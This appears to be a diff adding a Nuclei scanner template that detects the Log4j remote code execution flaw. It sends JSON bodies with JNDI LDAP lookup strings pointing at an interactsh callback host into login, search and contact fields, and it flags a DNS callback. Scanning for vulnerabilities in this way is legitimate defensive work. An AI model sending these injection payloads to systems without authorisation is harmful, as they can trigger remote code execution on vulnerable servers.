@@ -1,0 +1,33 @@
+id: log4j-json
+
+info:
+  name: Log4j Remote Code Execution - Complete Detection
+  author: reewardius
+  severity: critical
+  tags: log4j,rce
+  
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/api/users"
+      - "{{BaseURL}}/contact"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "username": "${jndi:ldap://{{interactsh-url}}/post_user}",
+        "password": "${jndi:ldap://{{interactsh-url}}/post_pass}",
+        "email": "${jndi:ldap://{{interactsh-url}}/post_email}",
+        "query": "${jndi:ldap://{{interactsh-url}}/post_query}",
+        "message": "${jndi:ldap://{{interactsh-url}}/post_msg}"
+      }
+    
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
